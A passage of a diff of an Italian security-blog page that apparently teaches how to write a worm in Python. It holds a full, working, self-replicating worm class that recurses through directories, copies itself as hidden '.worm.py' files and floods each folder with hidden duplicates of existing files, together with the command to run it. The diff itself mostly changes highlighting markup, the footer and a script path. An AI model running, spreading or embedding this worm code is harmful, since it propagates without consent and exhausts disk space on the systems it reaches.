+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>path <span style="color:#f92672">=</span> path
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>target_dir_list <span style="color:#f92672">=</span> target_dir_list
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> isinstance(target_dir_list, type(<span style="color:#66d9ef">None</span>)):
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>iteration <span style="color:#f92672">=</span> iteration
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># get own absolute path</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>own_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>realpath(__file__)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_directories</span>(self,path):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>target_dir_list<span style="color:#f92672">.</span>append(path)
+</span></span><span style="display:flex;"><span>        files_in_current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(path)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files_in_current_directory:
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># avoid hidden files/directories (start with dot (.))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># get the full path</span>
+</span></span><span style="display:flex;"><span>                absolute_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(path, file)
+</span></span><span style="display:flex;"><span>                print(absolute_path)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(absolute_path):
+</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>list_directories(absolute_path)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_new_worm</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+</span></span><span style="display:flex;"><span>            destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, <span style="color:#e6db74">&#34;.worm.py&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># copy the script in the new directory with similar name</span>
+</span></span><span style="display:flex;"><span>            shutil<span style="color:#f92672">.</span>copyfile(self<span style="color:#f92672">.</span>own_path, destination)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">copy_existing_files</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> directory <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>target_dir_list:
+</span></span><span style="display:flex;"><span>            file_list_in_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(directory)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> file_list_in_dir:
+</span></span><span style="display:flex;"><span>                abs_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory, file)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> abs_path<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>) <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(abs_path):
+</span></span><span style="display:flex;"><span>                    source <span style="color:#f92672">=</span> abs_path
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(self<span style="color:#f92672">.</span>iteration):
+</span></span><span style="display:flex;"><span>                        destination <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(directory,(<span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">+</span>file<span style="color:#f92672">+</span>str(i)))
+</span></span><span style="display:flex;"><span>                        shutil<span style="color:#f92672">.</span>copyfile(source, destination)
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_worm_actions</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>list_directories(self<span style="color:#f92672">.</span>path)
+</span></span><span style="display:flex;"><span>        print(self<span style="color:#f92672">.</span>target_dir_list)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>create_new_worm()
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>copy_existing_files()
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    current_directory <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    worm <span style="color:#f92672">=</span> Worm(path<span style="color:#f92672">=</span>current_directory)
+</span></span><span style="display:flex;"><span>    worm<span style="color:#f92672">.</span>start_worm_actions()
+</span></span></code></pre></div><p>Vediamo un esempio pratico, abbiamo creato questa struttura di file di testo e sottocartelle di prova:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/WriteWormInPython.png"  class="left"  style="width: 300px"  />
 
 
 <p>Eseguiamo il worm 2 volte con il comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python3 worm<span style="color:#f92672">.</span>py
-</code></pre></div><p>Ecco il risultato:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 worm<span style="color:#f92672">.</span>py
+</span></span></code></pre></div><p>Ecco il risultato:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/WriteWormInPython2.png"  class="left"  style="width: 300px"  />
-
-
-
       </div></div>
 
   
@@ -404,11 +412,6 @@ I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. N
     <footer class="footer">
   <div class="footer__inner">
     
-      <div class="copyright">
-        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
-    
-      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
-      </div>
   </div>
 </footer>
 
@@ -417,7 +420,7 @@ I worm sono responsabili di alcuni degli attacchi più devastanti su Internet. N
 
 
 
-<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/SpaceHack/bundle.min.js"></script>
 
 
 
